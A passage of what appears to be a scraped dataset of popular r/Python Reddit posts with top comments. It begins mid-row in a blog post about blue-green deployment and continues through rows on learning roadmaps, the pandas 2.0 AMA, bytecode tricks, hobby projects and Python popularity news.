This is a publicly-accessible static IP addresses that you can assign to a server and instantly remap between other servers in the same datacenter. My app domain (keepthescore.com) resolves to this static IP address. Internally, however, the IP is pointing to either the green or the blue server.

Both of my servers expose their hostname via a publicly accessible route: [https://keepthescore.com/hostname/](https://keepthescore.com/hostname/). Give it a try by clicking on the link!

So now it's possible for a human or a machine (using `curl`) to discover which the current live server is (blue or green).

The deployment script can use this information to always automatically deploy to the **idle** server. Here's my (simplified) BASH deployment script:

    # Get the current production server and 
    # set TARGET to the other server 
    CURRENT=$(curl -s https://keepthescore.com/hostname)
    if [ ""$CURRENT"" = ""blue-production"" ]; then
      TARGET=""green.keepthescore.com""
    else 
      TARGET=""blue.keepthescore.com""
    
    echo ""Current deployment is "" $CURRENT
    echo ""Deploying to "" $TARGET
    
    # Do deployment
    ssh -q root@$TARGET ""git pull""
    echo ""Deploy to "" $TARGET "" complete""

After I've run the script I can test the deployment on my laptop by simply pointing my browser to `blue.keepthescore.com` or `green.keepthescore.com`. Once I'm sure that everything's working I route traffic to the newly deployed idle server using DigitalOceans's web interface. (I could do this via script too, but haven't got round to it yet).

Result: My users get routed to the newly deployed software without noticing (hopefully).

Voilá! ✨

## What about continuous integration / continuous deployment?

I have no CI/CD pipeline. I do have a bunch of integration tests, but I run them manually. I will eventually get round to setting up some kind of automated testing, but so far there's been no need.

Just to be clear: when I run my integration tests, they happen on my laptop and use a test instance of the database. It's only when I do manual high-level testing on the idle staging server that the production database is used.

## What about the database?

There is only one database instance, so you might think this could be a problem. Martin Fowler, who wrote a [great article about blue-green deployments](https://martinfowler.com/bliki/BlueGreenDeployment.html) says the following:

>Databases can often be a challenge with this technique, particularly when you need to change the schema to support a new version of the software. The trick is to separate the deployment of schema changes from application upgrades. So first apply a database refactoring to change the schema to support both the new and old version of the application, deploy that, check everything is working fine so you have a rollback point, then deploy the new version of the application. (And when the upgrade has bedded down remove the database support for the old version.)""

I've been using this method so far. In fact, I have never done an automated schema migration of my database. It's worked great so far, so why do it differently?

## That's all

Thanks for reading my article! You can follow my journey as a bootstrapped one-man startup [on Twitter](https://twitter.com/wrede). See you in the next post!

One more thing: if you want to share this post, please consider using this [link](https://casparwre.de/blog/webapp-python-deployment/) (which points to my blog)","I am on a pretty slow line but this loads fast. Your site mentions that teachers and students can use it. How do you ensure information regarding minors are not disclosed freely? I work in health-care and at this time we are struggling with how to manage patient records for minors. We are a small team too, although we are not based out of Germany"
"My previous post on the algorithm i made to create these images blew up, so here is another! WITH a Github link: https://github.com/TyperOfCode/image_algorithm",dij6wi,2019-10-16 11:08:43,,Now you need to feed this whole meme through it.
Python is now the second most popular language in the world according to TIOBE. This is the highest position that Python reaches since 2001.,nlavn7,2021-05-26 15:19:41,,"According to Google Trends, Python is the most popular programming language in the world for about 3 years now."
I Made Snakes With Neural Networks! Here were the four best ones.,i2rofw,2020-08-03 13:54:05,,"Code bullet on YouTube made a really good one and a very interesting video on it too. He’s a really good programmer, you should go check him out"
Detailed Python developer roadmap,z3gntf,2022-11-24 18:34:46,"Hello! My name is Mikhail Emelyanov, I am embedded software engineer, and I was inspired to write this little roadmap on the capabilities of Python language by a certain commonality among the existing Python tutorials found on the web.

The usual suggestions to study, say, “Algorithms and Data Structures” or “Databases” are especially jarring. You can spend years studying these topics, and even after decades you'd still be able to find something you didn't know yet even without ever venturing outside the scope of Algorithms!

Using video game analogies, we can say that novice programmers often stand on the shore of the lake of boiling lava with an island with the ever-coveted jobs in the center, while the islands in between, which you have to jump on, gradually increasing your skills in successive mini-quests, are either missing, or arranged haphazardly, or their fairly smooth sequence breaks off, never having managed to get you any farther from the shore. Let's try to build a path of hint islands, a number of which, although not without effort, will finally allow us to reach our goal.

The roadmap is very easy to use. Just as you would in a normal text, go from left to right and from top to bottom. If you're just starting to learn Python, follow the green sections of the roadmap. If your accumulated experience, curiosity, or necessity pushes you deeper, start exploring the sections marked in gray. Orange marks the topics that require in-depth study, those are better to tackle (at least without digging especially deep to begin with) on the third pass.

This article definitely contains mistakes and inaccuracies of different calibers, and of course, many required subsections are missing; so, if you notice any of these, feel free to comment, and if you feel the Force, you're welcome to fork the [GitHub repository](https://github.com/amaargiru/pyroad) with the roadmap's source code and contribute whatever you feel is necessary; all corrections and additions are strongly encouraged. It also contains all the parts of the map in [Mermaid](https://github.blog/2022-02-14-include-diagrams-markdown-files-mermaid/) diagram format, as well as png/svg illustrations.

When diving into Python, don't forget the excellent official documentation at [docs.python.org](https://docs.python.org/). By studying it, at least in brief, and gradually reading deeper into the right sections, you will be able to see that many of the “hacks”, “findings” and other obscure matters have long since been considered, described and have detailed examples of use.

I would also recommend [leetcode.com](https://leetcode.com/problemset/all/?difficulty=EASY&page=1&status=NOT_STARTED) for learning basic Python syntax to the fullest extent. If you filter the tasks by “Easy” level, and then add an additional sorting by the “Acceptance” column, you'll be presented with a straightforward primer with smoothly increasing task difficulty, rather than the intimidating competitive platform.

Well, that’s enough stalling for the moment. Let's get started!

## Data Structures

https://preview.redd.it/lkulkxu3lv1a1.png?width=1636&format=png&auto=webp&s=a4015c2a3758026e19166731ffaa82dae843f24f

As a reminder, if you are a novice developer, go from left to right through the entries marked in green. Create instances of each type, try adding and removing elements, and experiment with them via the debugger. See how big the resulting objects are, and try to figure out why list and array containing the same data are different in size. Study the features of each type, read and figure out which data structure will work best for which tasks.

Don't forget that this is just a guide, a table of contents for a book that you will have to write yourself. Actively seek information on the web, consult sources and official documentation. Dive [Stackoverflow](https://stackoverflow.com/) just for fun, there's plenty of exciting reading there!

If you start to make progress, move on to the next section, and don't feel bad if you can't. Don't envision your mind as the sword of Alexander the Great cutting the Gordian knot in one fluid, precise move, worthy of Instagram's front page. Be as a carpenter’s plane, stripping away one thin layer at a time, and sooner or later the misunderstanding will go away, even if this seems to you to be a chasm ten thousand leagues deep.

## Data Management

https://preview.redd.it/3abaud65lv1a1.png?width=1885&format=png&auto=webp&s=01e490d208a44537c14a8e56c757c0ddf983f1a1

Try to manipulate your data, feel how you can mold anything you want out of this malleable clay. Try creating a data structure with many elements (a million, for example), sort them, quickly find the values you want with bisect, and write the results in a JSON file.

If everything goes according to plan, try to dig into the less obvious topics: apply regex to solve some simple task or save previously obtained data in Pickle format, understanding the reason for binary file formats after observing the size of the resulting files.

This is where you will find the first entries marked in orange. Google what TensorFlow and Keras are and what tasks they solve. Perhaps, this could be your future job, your vocation!

## Data Flows

https://preview.redd.it/c6d70lf6lv1a1.png?width=1841&format=png&auto=webp&s=d1e36177e411db0cc037e255087999af0af3cc5e

Add more specific capabilities to your data management skills. All of the topics covered are essential in the practical programming process and are present in all modern languages in one form or another. That way, if you eventually switch from Python to Java, C# or C++, the knowledge you've acquired won't become dead weight.

## Object-Oriented Programming

https://preview.redd.it/hv5hj3t7lv1a1.png?width=1408&format=png&auto=webp&s=50c9802a69a2d2280ed998c37cad6d52a3869718

Dive into the subject of object-oriented programming. Understand that objects are your friends, and all their features and properties, even if they are not quite intuitive at first glance, have purely utilitarian reasons for existing.

OOP makes it much easier to partition, develop and maintain code, not just making very complex tasks feasible for average programmers, but making the world around us more manageable, predictable and generally better.

## Language Skeleton

https://preview.redd.it/mr6778x8lv1a1.png?width=1240&format=png&auto=webp&s=14ed84bf992c1f376917687558ecec359abac22d

Perfect, a bit deeper now. Studying how GIL or GC works will give you an understanding of why things go awry in one case or another, not at all the way you planned. You are likely to use exceptions all the time, given that they can occur in some operations with data structures, so study them further.

## Multithreading and Multiprocessing

https://preview.redd.it/vdgn2t1alv1a1.png?width=1370&format=png&auto=webp&s=8e2c1f0278e38f8180d3ba6224c00db2baf8f218

Before you dive into multithreading and multiprocessing, be sure to study their typical use cases. There may be situations in which the gain is minimal or non-existent.

Try to implement simultaneous fast data processing and waiting for user input, which changes the input data for calculations, so you understand the capabilities, pros and cons of different approaches.

Don't try to use all the features provided by Python at once, stick to the task at hand.

## Common Practices

https://preview.redd.it/uhaxz92blv1a1.png?width=1498&format=png&auto=webp&s=d229ae69d1734c11bf4763342a8db28e72029109

Description of common methods used in almost all software projects, not just in Python. I/O, profiling, and logging apply universally.

Testing in general constitutes a separate profession, and often the quality of a software product can be judged by the test coverage of the source code. For example, the code of the SQLite database is 100% [covered by tests](https://www.sqlite.org/testing.html), while one line of ""combative"" code requires 608 lines of tests.Jokes aside, projects with 100% coverage are not common, but pytest used wisely is the best guarantor of your sound sleep at night!

## Algorithms

https://preview.redd.it/nwqb1f4clv1a1.png?width=1172&format=png&auto=webp&s=1c53be6fd370a5c2080e3256fa160c28f8dc77a4

One of those areas of human knowledge that you can delve into endlessly. On the other hand, the learning curve of this discipline for covering the practical needs of the average programmer has long been known, so the initial stages shouldn't be too difficult for you. Who knows, maybe you'll enjoy it so much and drag it out that in time you might even be able to contribute a new robust argument in the discussion of “[Equality of P and NP classes](https://en.wikipedia.org/wiki/P_versus_NP_problem)”!

## Databases

https://preview.redd.it/m7o764adlv1a1.png?width=1904&format=png&auto=webp&s=af27de81ca1fc90e925ef786ac8d3e1bbecbd43c

Learn the general concepts first, and then the specifics of working with specific database management systems. Try working with SQLite, even if you're planning to switch to PostgreSQL later. SQLite is a very popular database, used in Android, Chromium and dozens of other popular projects. You can use SQLite as a convenient local storage alternative to working with files directly.

By the way, try to briefly return to chapter one, Data Structures, to understand how and why the inner workings of databases are structured.

This also provides yet another door into a ""another world"". Perhaps you would like to tie your future to databases by becoming a [DBA](https://en.wikipedia.org/wiki/Database_administrator)?

## Net

https://preview.redd.it/fb30mm5flv1a1.png?width=831&format=png&auto=webp&s=d7f0ca1388cee55cf163b7df27298e14e46202ee

Try to create a client and a server, poke some popular website or an open API. Here you might as well experiment with HTML, CSS, and even Java(Type)Script. Who knows, perhaps your choice would be to become a full-stack programmer, combining back- and frontend development.

## Architecture

https://preview.redd.it/ap04zpshlv1a1.png?width=1904&format=png&auto=webp&s=3b355ad3539bb8e3ca48071f7abace825f8af98f

Please try not to memorize architectural principles by heart; they are not Shakespeare's timeless poems. The rambling about how “Liskov's substitution principle means that if S is a subtype of T, then objects of type T in a program can be...” offers no advantage to anyone. Just try applying the same LSP to the program you are writing. What benefit would compliance with this principle give you? What problems will result from not following it? What price will you have to pay for its implementation and support?

Try messing around with the functional paradigm. Applying the functional approach and using it in practice is possible not only in Haskell or F#, but also in Python, and it doesn't have to be done only within functools.

Figure out the reasoning behind the job interviewer's request to “say the three main words” (it's not “I love you”, by the way, it’s “inheritance, encapsulation, polymorphism”) and why this triad should be supplemented with the “abstraction”.

Try to understand what specific, tangible problems of the old paradigms the developers of Agile or the popularizers of microservice architecture faced. Figure out what's wrong with main(), which calls all the other procedures, since this is common practice in embedded programming. Weigh the cost of additional layers of abstraction between the root business logic and the outside world.

## Deployment and Administration

https://preview.redd.it/7i30vl1jlv1a1.png?width=1229&format=png&auto=webp&s=11dfe2a1777ed68406dcaab3969be72faf6a534a

Despite the fact that git and especially Linux are quite complicated and extensive topics, the beginning of their learning curve isn't very steep, so I highly recommend starting your DevOps mastering with git (at least the add-commit-push part, so you at least have a revision history, flawed as it is) and Linux (PuTTY + WinSCP, for example; copy your Python scripts via SSH and run them on a remote Linux machine). Fortunately, these days good text and video tutorials covering these topics are about as rare as grains of sand on the beach. Take it from me, the Linux console that looks so strange and inconvenient at first sight will seem much more familiar once you start learning vim. Cognition comes through comparison!

Well, this is where our map ends. Try to reach the last green section, GitHub Actions; run a linter on your open source project, for example (GitHub Actions is free for open source projects).

## Overall Roadmap

The overall roadmap can be obtained by simply mechanically adding up the previous entries, just so we can see what we've ended up with. Overall [Mermaid](https://github.com/amaargiru/pyroad/blob/main/13_Full.md), [svg](https://raw.githubusercontent.com/amaargiru/pyroad/main/pics_svg/13_Full.svg), [png](https://raw.githubusercontent.com/amaargiru/pyroad/main/pics_png/13_Full.png).

https://preview.redd.it/9c58t9yjlv1a1.png?width=1904&format=png&auto=webp&s=996729b191a58143eb90697d50c35483e36c21b8

## That’s all for now

As you may have noticed, there is no mention of control constructs, IDE installation or virtualenv in this guide. In my opinion, all these topics are very important, but do not constitute the essence of the language, representing something like a binding solution, while the topics discussed in the article, from list to Kubernetes, serve as the full-fledged “bricks”.

As a reminder, all the diagrams are made in Mermaid format (you can change the picture just by correcting the text), all the sources are available on [GitHub](https://github.com/amaargiru/pyroad), correct as much as you want, or, of course, leave comments directly in the comments section.

Separately, I welcome all beginner programmers. You will come to realize that working 8 hours in a row using your head and not your hands is hard, too. But, no matter what languages you plan to code in and no matter how far you've come in this difficult task, you will definitely upgrade your brain, improve your understanding of the world around you and start to recognize secret passages where you have seen only impenetrable walls before. So it's time to start the IDE, focus a little bit, and start practicing.

And remember: “This is my Python. There are many like it, but this one is mine. My Python is my best friend. It is my life. I must master it as I must master my life.  Without me, my Python is useless. Without my Python, I am useless. My Python and I know that what counts in life is not the words we say, the lines of our code, nor the time we spend at the office. We know that it is the completed tasks that count. We will complete them... My Python is human, even as I'm human, because it is my Python. Thus, I will learn it as a brother. I will learn its weaknesses, its strength, its parts and accessories, its standard library and its infrastructure. I will keep my Python from dangerous misunderstanding or suboptimal use, even as I do my legs and arms, my eyes and heart from any harm. I will keep my Python clean and ready. We will become part of each other. So be it.”","Nice roadmap put together, the green boxes are near impossible to read unfortunately on GitHub."
Today is the last day of Python 2 support!,ei0hjq,2019-12-31 17:03:33,,Maybe Google will finally stop returning Python 2 documentation as its first hit?
Python Helped me Write Again,62q2sm,2017-04-01 10:39:39,"[A letter in my own handwriting](http://imgur.com/a/W4ZIk).

I learned Python in 1998, and I used it pretty much daily through my working life. Its connectivity with everything has allowed me to do all kinds of interesting and fun things. When I discovered that the [AxiDraw](http://www.axidraw.com/) pen plotter has a [Python binding](https://github.com/inconvergent/axidraw-xy), I decided to try writing in my own handwriting with my own pen. Something I've been unable to do for years.

It has taken a lot, mostly because I can't type, so I've been limited to voice recognition and copy and paste, but the letter linked above is where I got to this evening.

I thought I would share my mini triumph.

I've learned and programmed in a lot of different languages over the years. I have written several languages myself. And even though Python wasn't my first language, it is the first language I consider for any new project. I'd have to have a compelling reason to use something else. So thank you, Python, for making this possible.

</ shameless preaching to the choir> ;)

---

Edit: In the comments a couple of people asked for a video. I will make a proper video with the AxiDraw as soon as I can. [We just did a quick test](https://youtu.be/W5YGwNlO53A) on my wife's Cricut craft cutter. It works there too, though you can't tilt the pen or change the pressure. So apologies it's not the proper plotter, but you can see how the paths are traced on this video.","You wrote 10,000 lines of python code by voice? Holy cow that's amazing. Can you share the code? Can you show us some pictures​ or video of the plotter working?"
Made a fluid simulation for my engineering exams,fm24jb,2020-03-21 04:28:55,,"Oh cool, so has engineering classes left the MATLAB world now?

I remembered 6-7 years ago, all programming done in my engineering classes were required on MATLAB"
Learn something new about Python every day in less than 1 minute,kvol74,2021-01-12 17:40:02,"I'm running a channel, where I am publishing a Python mini-tutorial every day. I thought some of you might find it useful:

https://www.youtube.com/c/PythonIn1Minute/videos

I try to keep it beginner-friendly, my goal is to teach something useful or show a neat trick or solve a common pain-point in under 60 seconds.

I am quite new to this youtube thing, so I'd love to hear your feedback. Is this kind of thing a good idea? Do you find it helpful? Any suggestions on what could be improved?

Edit: I am overwhelmed by the amount of positive and constructive feedback, you guys are awesome, thank you so much!
You gave me a lot of great ideas, and the motivation to keep creating videos.

Edit2: If you can afford it and you wish to support my work you can [buy me a coffee](https://www.buymeacoffee.com/jcsongor) or [become a patron](https://www.patreon.com/PythonIn1Minute).","Nice idea. You got me. 

My suggestion would be adjusting the format. Use the whole screen and increase the fontsize. It almost not watchable on phone.

Keep it up"
"*Update* Thank you all for your suggestions on my previous post about Handwriting Synthesis Algorithm, after going through all the comments and ideas you all shared, I have made Handwriting Synthesis v2, please review and suggest any changes/add-ons.",fr1x65,2020-03-29 15:17:36,,"Do you have a working prototype, Mind sharing the resource or source code"
"We are the developers behind pandas, currently preparing for the 2.0 release :) AMA",11fio85,2023-03-02 05:28:33,"Hello everyone!

I'm Patrick Hoefler aka phofl and I'm one of the core team members developing and maintaining pandas ([repo](https://github.com/pandas-dev/pandas), [docs](https://pandas.pydata.org/docs/dev/index.html)), a popular data analysis library.

This AMA will be at least joined by

* [Marc Garcia](https://github.com/datapythonista) \-- maintainer
* [Marco Gorelli](https://github.com/marcogorelli), -- maintainer
* [Richard Shadrach](https://github.com/rhshadrach) \-- maintainer
* [me](https://github.com/phofl)! -- maintainer

**The official start time for the AMA will be 5:30pm UTC on March 2nd**, before then this post will exist to collect questions in advance. Since most of us live all over North America and Europe, **it's likely we'll answer questions before & after the official start time by a significant margin**.

**pandas** is a Python package that provides fast, flexible, and expressive data structures designed to make working with ""relational"" or ""labeled"" data both easy and intuitive. It aims to be the fundamental high-level building block for doing practical, **real world** data analysis in Python. Additionally, it has the broader goal of becoming **the most powerful and flexible open source data analysis / manipulation tool available in any language**.

We will soon celebrate our 2.0 release. We released the release candidate for 2.0 last week, so the actual release is expected shortly, possibly next week. Please help us in testing that everything works through [testing the rc](https://github.com/pandas-dev/pandas/releases/tag/v2.0.0rc0) :)

Ask us anything! Post your questions and upvote the ones you think are the most important and should get our replies.

\- Patrick, on behalf of the team

&#x200B;

&#x200B;

Marc:

I'm Marc Garcia (username datapythonista), pandas core developer since 2018, and current release manager of the project. I work on pandas part time paid by the funds the project gets from grants and sponsors. And I'm also consultant, advising data teams on how to work more efficiently. I sometimes write about pandas and technical topics at my [blog](https://datapythonista.me/blog/), and I speak at Python and open source conferences regularly. You can connect with me via [LinkedIn](https://www.linkedin.com/in/datapythonista/), [Twitter](https://twitter.com/datapythonista) and [Mastodon](https://fosstodon.org/@datapythonista).

Marco:

I'm Marco, one of the devs from the AMA. I work on pandas as part of my job at Quansight, and live in the UK. I'm mostly interested in time-series-related stuff

Patrick:

I'm Patrick and part of the core team of pandas. Part of my daytime job allows me to contribute to pandas, I am based in Germany. I am currently mostly working on Copy-on-Write, a new feature in pandas 2.0. (check my [blog-post](https://medium.com/towards-data-science/a-solution-for-inconsistencies-in-indexing-operations-in-pandas-b76e10719744) or our new [docs](https://pandas.pydata.org/docs/dev/user_guide/copy_on_write.html) for more information).

Richard:

I work as a Data Scientist at [84.51](https://www.8451.com/) and am a core developer of pandas. I work mostly on groupby within pandas.

\--

* [Announcement post](https://www.reddit.com/r/Python/comments/11ebuh0/join_us_for_an_ama_with_the_developers_of_pandas/)
* [full pandas team](https://pandas.pydata.org/about/team.html)
* [Marc wrote about pandas 2.0 and our Arrow support](https://datapythonista.me/blog/pandas-20-and-the-arrow-revolution-part-i)",What's the most impressive/unimaginable use of Pandas you've come across?
A strongly typed dialect of Python is coming. I would like to humbly suggest a name for it.,rs2utp,2021-12-30 22:19:11,"With type hints, secondary tooling like the `typing` module, and really good inspectors like Pyright already available, a strongly typed dialect of python is definitely coming. Just like the JavaScript world is heavily adopting their version of the same in TypeScript, the new dialect will likely have a new name.

Here’s the issue: the name that keeps getting floated is ‘Typed Python’. Forgive me, but that name sucks and has no character. A language invented while Clinton was President by a guy with one of the 3 coolest first names you can have, and named after a sketch comedy show deserves better than this.

Thus, I would like to propose a simpler name; one that is more ‘pythonic’ if you will. If we just exchange the positions of the “P” and the “T” we evoke the same idea (in addition to making it wonderfully Google-able) and get the name:

**Typhon**


**EDIT**: I failed to mention and have since learned that Typhon and Python both come from Greek Mythology—and both were serpant giants. Typhon battled Zeus and Python battled Apollo. Python was memorialized by having a big snake named after him. Typhon still awaits his big come up (*which is why I have gathered you all here today*). But given the natural association between them from mythology already, I really love how smoothly this all seems to go together from different angles.",Snek
The New Switch-Case Statement in Python 3.10,m8l7ip,2021-03-20 00:36:03,,Finally
I wrote an integrated POS system for my girlfriend's restaurant using tkinter.,cc5ch7,2019-07-12 11:07:02,,"Very impressive. I work with POS systems and I do know a company that is seriously kicking around a linux port.

If you're interested message me and I can provide info for contact.

r/raspberry_pi would love this, consider a cross-post."
Python passed Java as the second-most popular language on GitHub by repository contributors,dsxv07,2019-11-07 21:40:40,,"As someone who never wants to have to seriously learn Java, this is great news"
I recently updated my pandas dataframe GUI so you can easily embed it in your own Flask apps. Here's a quick demo I made. Code linked in comments.,jittwt,2020-10-27 11:30:38,,"This is my flask/react based GUI for pandas dataframes, [D-Tale](https://github.com/man-group/dtale). Since it's using Flask it's relatively easy to integrate into your own Flask apps. Here is some [documentation](https://github.com/man-group/dtale#embedding-within-your-own-flask-app) on how and here's the [source code](https://github.com/man-group/dtale/tree/master/docs/embedded_dtale) for the demo shown above.

I know the front-end leaves a lot to be desired on the demo but I didn't want to go overboard and cloud the example with a bunch of extra logic.  Any questions on how to jazz it up I'm happy to answer :)

Please let me know if theres anything else I can do to make this easier and support open-source by tossing your star on the repo. Thanks!"
I created a library called 'handcalcs': it renders your Python calculations in Latex as though you had written them by hand.,ijjppe,2020-08-31 04:20:48,"Doing calculations in Jupyter is enjoyable but can require endless `print()` statements with f-strings to show your results.

With handcalcs, use the `%%render` cell magic and your Python calculation is rendered with the symbolic formula, followed by the numeric substitution, and then the result, just as though you had written it by hand.

  
Works as both a cell magic and as a decorator on your functions. For engineers, data scientists, educators, and students.  


[handcalcs on Github](https://github.com/connorferster/handcalcs)

&#x200B;

https://i.redd.it/8fcq9mrm67k51.gif",Neat alternative for those of us that use latex in markdown cells.
Tiler - A Tool To Build Images Out Of Other Images (link in comments),d0ymj4,2019-09-08 01:07:20,,[Repo](https://github.com/nuno-faria/tiler)
Python powered slot car track,fw86w2,2020-04-07 06:12:17,,"MAN, post a video ASAP. Need to see it in action"
"Animated Dijkstra, sidewinder maze, pillow and imageio (xpost /r/proceduralgeneration",au3ha5,2019-02-24 10:51:18,,"Sorry for the crosspost, just really honestly proud of this one.    


This is my own implementation in python based on the implementation in ruby in the book [Mazes for Programmers](https://pragprog.com/book/jbmaze/mazes-for-programmers). Excellent book. Strongly recommended.     


Here is the ugly [sourcecode](https://github.com/tetrismegistus/minutia/tree/master/exercises/mazesforprogrammers)."
Sudoku App,enel78,2020-01-12 06:40:41,,Gui is made using PyQt5. The beginning board is hard coded but the solve does actually use an algorithm to solve the board and would work with any solvable starting board
I created my first neural network that can recognize handwritten digits (Github link in comments),c91v2r,2019-07-04 20:11:00,,"Great start but there are alot of things you could do to make your code faster smaller cleaner and therefore better

The first thing is just using the ""compressed"" dataset rather then your jpeg solution as there is literally no difference apart from the extra processing time to convert the images into numpy arrays and the raw size of the file

Try using keras.datasets.mnist

The way you make your model is also a bit weird, why are you using for loops to put layers into your network. You aren't using an insane ammount of layers so it is only logical to just manually put them into your model. This would allow for other people to see the structure of your model without having to download and run your code.

A side note, I often see people using the following code:

    model = keras.models.Sequential()

    model.add(a)

    model.add(b)

    model.add(c)

When there is a much more readable and simpler way of doing it

    model = keras.models.Sequential([
        a,
        b,
        c,
    ])


It just kind of triggers me when I see the first option even though it's industry standard essentially but it's totally fine to do it that way

It does seem like your code is very bloated for what it does so there is some room to improve but this is an amazing start

If you want to further your ml skills I'd reccomend trying the Titanic prediction challenge on kaggle"
Python just surpassed Java as the 2nd programming language with the highest number of questions in SO.,pv4if3,2021-09-25 18:52:42,,And 90% of them are probably about matplotlib...
Enable ++x and --x expressions in Python,pnie05,2021-09-14 00:01:37,"By default, Python supports neither pre-increments (like `++x`) nor post-increments (like `x++`), commonly used in other languages. However, the first ones are *syntactically correct* since Python parses them as two subsequent `+x` operations, where `+` is the unary plus operator (same with `--x` and the unary minus). They both have no effect, since in practice `-(-x) == +(+x) == x`.

I'd like to share the [plusplus](https://github.com/borzunov/plusplus) module that turns the `++x`\-like expressions into `x += 1` at the bytecode level, using pure Python only.

Unlike `x += 1`, `++x` is still an expression, so the increments work fine inside other expressions, `if`/`while` conditions, lambda functions, and list/dict comprehensions:

    array[++index] = new_value
    
    if --connection.num_users == 0:
        connection.close()
    
    button.add_click_callback(lambda: ++counter)
    
    index = 0
    indexed_cells = {++index: cell for row in table for cell in row}

**Note:** I don't claim that allowing increments is good for real projects (it may confuse new developers and give opportunities to write less readable code), though some situations when they simplify the code do exist. I've made this module for fun, as a demonstration of Python flexibility and bytecode manipulation techniques.

The module works by replacing the bytecode patterns corresponding to the `++x` and `--x` expressions with the bytecode for actual incrementing. For example, this is what happens for the `y = ++x` line:

[Two consecutive UNARY\_POSITIVE instructions are replaced with adding one and storing the result back to the original place](https://preview.redd.it/2k692gaulan71.png?width=821&format=png&auto=webp&s=8b440b0cf9bc2bae5a2695f1831a810f0d5f55d4)

It's not always that simple: incrementing object attributes and collection items requires much trickier bytecode manipulation (see the [""How it works""](https://github.com/borzunov/plusplus#how-it-works) section in the docs for details).

To use the module, you can just run `pip install plusplus` and add two lines of code enabling the increments. You may do this for just one function or for the whole package you're working on (see the [""How to use it?""](https://github.com/borzunov/plusplus#how-to-use-it) section).

**Updates:**

* The same approach could be used to implement the assignment expressions for the Python versions that don't support them. For example, we could replace the `x <-- value` expressions (two unary minuses + one comparison) with actual assignments (setting `x` to `value`).
* See also [cpmoptimize](https://kukuruku.co/post/automatic-algorithms-optimization-via-fast-matrix-exponentiation/) \- my older project about Python bytecode manipulation. It optimizes loops calculating linear recurrences, reducing their time complexity from O(n) to O(log n). The source code is available on [GitHub](https://github.com/borzunov/cpmoptimize) as well.","I hate both the idea of using the unary operator and the ability to manipulate the behavior of the bytecode.

This is the most interesting post I've seen on this sub in a while."
Python 3.10 Released!,q1dqcv,2021-10-05 04:01:51,,"More excited for structural pattern matching than I was for f-strings, and _boy howdy_ was I excited for f-strings."
I wrote a Network Packet Sniffer for ethical hacking in Python 3 that exclusively uses built-in libraries.,jxobtr,2020-11-20 20:41:23,"The greatest problem when looking for implementations of network packet sniffers in Python 3 is that nearly all of them rely heavily in third-party libraries like Scapy or kamene that, though very convenient, may not be at hand when an ethical hacking engagement has to take place in restrictive environments.

For this reason I implemented this basic packet sniffer using just built-in libraries and fully compatible with Python 3.x. It is implemented in OOP, leverages libraries like ctypes, socket, argparse and others and relies on the use of abstract base classes, inheritance, special methods, decorators and design patterns (command, observer and  template). We also employ some manipulation of binary and hexadecimal values that are formatted for the use on raw sockets.

This tool is part of an upcoming (though not nearly ready) series of video tutorials I plan to launch some time in the next year. It might be a rather long course given how much we'd need to cover about all the underlying networking and programming topics.

It's available on GitHub. Use wisely.

[https://github.com/EONRaider/Packet-Sniffer](https://github.com/EONRaider/Packet-Sniffer)","Cool project.

What amazes me even more is that you managed to do it in less than 400 lines of code."
I'm a generative artist and currently obsessed with domain warping,drhez2,2019-11-04 21:11:33,,"The [introduction](https://www.iquilezles.org/www/articles/warp/warp.htm) by Inigo Quilez got me started. More examples of this kind of [stuff here](https://www.instagram.com/p/B4cayHAHOEN/).

Some more info: this algorithm takes two input images, samples each pixel, and uses those measurements in funky ways to select a pixel from a 3rd image. The input images are previous generative artworks that I made, which have a totally different look and feel."
Matplotlib add-on to make Tron-style plots: github.com/dhaitz/mplcyberpunk,fuzxw4,2020-04-05 03:42:48,,[github.com/dhaitz/mplcyberpunk](https://github.com/dhaitz/mplcyberpunk)  just so that there is a clickable link.
Simulating Quantum Mechanics Using Matplotlib and Tkinter,ciojde,2019-07-28 07:26:29,,Can you please explain what the fuck I’m looking at? I know a very small amount about the subject.
Playing Flappy Bird with Mixed Integer Programming,de92or,2019-10-07 04:42:00,,"My friend Ben and I wrote up a controller for flappy bird. cvxpy for the win!

Code here: https://github.com/philzook58/FlapPyBird-MPC

and our blog posts here:

* http://www.philipzucker.com/flappy-bird-as-a-mixed-integer-program/
* http://blog.benwiener.com/programming/2019/10/06/flappy-bird-mpc.html"
I brute forced hello world [Code and Reasons in the comments],dyc4ce,2019-11-19 08:08:33,,"You can make it look more like movie hacking (letters in one place)

    import time
    import sys

    target = 'Hello world'
    guess = ''
    
    for i, c in enumerate(target):
        j = ord(' ')
        while True:
            sys.stdout.write(f'\r{guess}{chr(j)}')
            sys.stdout.flush()
            time.sleep(0.01)
            if chr(j) == c:
                guess += c
                break
            j += 1

    print('\n\nACCESS GRANTED')"
Today is my first day learning coding and I am awestruck.,ks94qq,2021-01-07 16:33:02,"Okay, so I'm a freshman in uni who was just vibing at home during winter break in quarantine with absolutely nothing to do. I'm scrolling on Youtube and I come across this 4 hour long video from freeCodeCamp.org about Python, and on a whim, I decide to just see what the computer science hype is all about. And-

BRO

BRO

I don't know what I expected coding to be, but this is fricking awesome. It just makes me baffled how  I can just make stuff on my computer that has never existed in the history of the computer! 

Like, I just learned about inputs, and I wrote this whole funny conversation with my computer about how horrible my high school was (btw she was very sassy, and yes, I do have many unrepressed feelings about that place LOL). Anyways, I don't know if this is the right place to showcase my immense exuberance, but I guess I now do understand what all the hype is about.","Great to hear :)
Get ready to be amazed by the unlimited possibilities. The greatest thing about coding is, you’re able to create something without needing expensive tools, materials or a workshop. Your computer and your imagination is all you need. Have fun ;-)"
The second version of my simple game. It's still pretty pathetic. But now I have implemented a little object orientation (now my code has classes: P).,hcb1zz,2020-06-20 07:14:04,,"Don't be self deprecating.  You are doing something and learning.

Doing something and putting it out there is a huge step.  Be proud."
Is it just me or did the creators of the Python QT5 GUI library miss a golden opportunity to call the package QtPy?,xykohy,2022-10-08 13:42:29,,Import PyQt as QtPy
Cracking like print type,e5i7xp,2019-12-03 22:55:22,,Now you just need to create a GUI in visual basic to find the killer's IP address.
I Used Deep Learning To Identify Naruto (Anime Series) Hand Signs,foukc7,2020-03-26 01:41:58,,This sub has officially peaked thank you OP
Super Potato Bruh - A game written entirely in Python/Pygame.,9h76as,2018-09-20 01:28:25,,Looks great! Planning to buy tonight.
"I made an Android app that detects and recognises traffic signs, using Kivy and OpenCV, to help combat traffic casualties worldwide",glikj1,2020-05-18 00:41:22,,"I am sure you understand the model you use should be country-specific. USA, for example, does not follow the international standard. The same issue in many African countries. Would suggest not to claim global applicability until you actually can.

